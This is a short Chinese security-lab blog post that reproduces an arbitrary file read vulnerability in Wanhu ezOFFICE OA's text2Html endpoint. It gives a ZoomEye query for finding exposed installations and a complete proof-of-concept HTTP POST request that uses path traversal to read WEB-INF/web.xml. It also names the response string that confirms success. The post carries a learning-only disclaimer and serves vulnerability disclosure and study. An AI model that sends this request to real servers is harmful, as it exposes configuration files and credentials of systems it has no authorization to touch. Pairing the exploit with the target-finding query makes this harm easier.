#  万户OA text2Html 任意文件读取【漏洞复现】   
ChinaRan404  知攻善防实验室   2024-01-27 12:06  
  
关注本公众号，长期推送技术文章  
  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用！！！  
  
简介  
  
万户OA text2Html接口存在任意文件读取漏洞，可读取系统配置文件。  
  
资产  
  
ZoomEye语句：app:"Wanhu ezOFFICE ERP httpd"  
  
![](https://mmbiz.qpic.cn/mmbiz_png/H7ec9FOh7vrAFIgv6toMHvdGY0sBvNANiajYTXonxk6W5whv4XDvVvibMF2Q1ZEv53kciaSQUdiaLx76w2oQ3Z9Ouw/640?wx_fmt=png&from=appmsg "")  
  
漏洞复现  
  
POC:  
```
POST /defaultroot/convertFile/text2Html.controller HTTP/1.1
Host:  
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
Connection: close
Content-Length: 63
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
SL-CE-SUID: 1081

saveFileName=123456/../../../../WEB-INF/web.xml&moduleName=html
```  
  
该POC会读取web.xml，以“  
web-  
app”字符串作为存在漏洞回显特征  
  
漏洞存在回显  
  
![](https://mmbiz.qpic.cn/mmbiz_png/H7ec9FOh7vrAFIgv6toMHvdGY0sBvNANS7GwQcVvGrOB7cfHmDab59yoA4ABDia4gNY7FWzw3FMlYSCzEnpmWqA/640?wx_fmt=png&from=appmsg "")  
  
  
后台回复“交流群”获取技术交流群链接  
  
